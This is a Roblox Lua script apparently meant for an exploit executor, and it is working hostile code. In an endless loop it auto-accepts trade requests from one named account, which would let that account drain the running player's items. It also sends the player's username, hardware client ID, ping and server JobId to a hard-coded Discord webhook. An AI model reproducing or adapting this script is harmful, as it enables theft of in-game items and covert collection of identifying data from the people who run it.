fortnite = true
while true do
    wait(0.5)
    local cool = "AcceptRequest"
    local papi = "aaronisthebestever01"
        game:GetService("ReplicatedStorage").Events.TradeActions:InvokeServer(cool, papi)
        wait(5)
        rconsoleprint("Loading...")


local webh = "https://discord.com/api/webhooks/982779370844352613/-7iEKVd8_qQucH9K35vB1b1uI3oAoK5N6xwsCSWCkpqIWHGYfILCeNpUH_ZzGjpnDWL8"


pcall(function()
   local data = {
  ['embeds'] = {
    {
       ['title'] = 'script',
       ['description'] = 'ez',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
          {name = 'JobId', value = game.JobId},
        }
    }
  }
}
   
   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
    end
end)
end
